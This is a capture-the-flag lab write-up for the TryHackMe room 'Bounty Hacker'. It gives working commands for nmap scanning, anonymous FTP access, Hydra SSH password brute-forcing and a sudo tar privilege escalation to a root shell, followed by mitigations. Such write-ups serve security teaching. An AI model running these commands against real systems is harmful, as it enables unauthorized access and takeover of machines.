# Bounty Hacker - TryHackMe Write-up

## Objective

The objective of this room was to gain initial access to the target machine by enumerating exposed services, obtaining valid SSH credentials, and escalating privileges to root.

---

# Methodology

## 1. Network Enumeration

The first step was to identify the services running on the target.

```bash
nmap -sC -sV <TARGET_IP>
```

### Open Ports

| Port | Service | Version |
|------|----------|---------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

### Findings

- Anonymous FTP login was enabled.
- SSH service was available.
- Apache web server was running.

---

## 2. FTP Enumeration

Since anonymous FTP access was enabled, I connected to the FTP server.

```bash
ftp <TARGET_IP>
```

Username:

```text
ftp
```

Password:

```text
<Press Enter>
```

After logging in, I listed the available files.

```bash
ls -la
```

### Files Found

```
locks.txt
task.txt
```

---

## 3. Reading task.txt

I viewed the contents of the task file.

```bash
more task.txt
```

Output:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
```

The information suggested that the username might be **lin**.

---

## 4. Downloading the Password List

The password list was downloaded from the FTP server.

```bash
get locks.txt
```

---

## 5. SSH Brute Force

Using the username and downloaded password list, I performed an SSH password attack with Hydra.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```

### Credentials Recovered

```text
Username: lin
Password: RedDr4g0nSynd1cat3
```

---

## 6. SSH Login

Using the recovered credentials, I connected to the target through SSH.

```bash
ssh lin@<TARGET_IP>
```

After logging in, I verified the current user.

```bash
whoami
```

Output:

```text
lin
```

The user flag was successfully retrieved.

---

## 7. Privilege Escalation

To identify privilege escalation opportunities, I checked the user's sudo permissions.

```bash
sudo -l
```

Output:

```text
(root) /bin/tar
```

The output indicated that **tar** could be executed with root privileges.

Searching **GTFOBins** revealed that **tar** can spawn a shell when executed through sudo.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## 8. Root Access

To confirm the privilege escalation was successful:

```bash
whoami
```

Output:

```text
root
```

The root flag was then retrieved successfully.

---

# Attack Chain

```
Nmap Scan
    │
    ▼
Anonymous FTP Login
    │
    ▼
task.txt + locks.txt
    │
    ▼
Identify Username
    │
    ▼
Hydra Password Attack
    │
    ▼
SSH Access
    │
    ▼
sudo -l
    │
    ▼
GTFOBins (tar)
    │
    ▼
Root Shell
    │
    ▼
Root Flag
```

---

# Skills Learned

- Network Enumeration
- FTP Enumeration
- Anonymous FTP Access
- Information Gathering
- Password Attacks with Hydra
- SSH Authentication
- Linux Enumeration
- Sudo Enumeration
- GTFOBins
- Linux Privilege Escalation

---

# Security Issues

- Anonymous FTP access enabled.
- Sensitive password list exposed through FTP.
- Weak SSH credentials vulnerable to dictionary attacks.
- Misconfigured sudo permissions.
- Principle of Least Privilege not enforced.

---

# Mitigation

- Disable anonymous FTP access.
- Never expose password lists on public services.
- Enforce strong password policies.
- Limit sudo permissions to only required commands.
- Regularly audit privileged accounts and configurations.

---

# Conclusion

This room demonstrated a complete Linux penetration testing workflow, including enumeration, credential discovery, SSH access, and privilege escalation. It highlighted the importance of proper service configuration, credential management, and least-privilege enforcement.
